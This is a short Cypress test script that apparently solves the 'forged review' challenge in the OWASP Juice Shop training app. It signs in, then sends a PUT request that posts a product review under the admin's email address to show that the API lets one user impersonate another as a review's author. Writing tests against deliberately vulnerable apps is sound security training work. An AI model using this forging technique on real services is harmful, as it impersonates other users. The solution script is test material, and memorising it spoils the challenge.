export function forgedReviewChallenge() {
     
  cy.signin('cypress@mail.com','cypress');
      
  cy.get('@token').then((token) => {
        
    const options = {
      method: 'PUT',
      url: '/rest/products/1/reviews',
      body: {
        author: "admin@juice-sh.op",
        message: "very bad product"
      },
      auth: { 
        bearer: token
      }
    }

    cy.request(options).then(() => {
      cy.isSolvedChallenge('forgedReviewChallenge').should('eq', true);
    });
        
  });

}
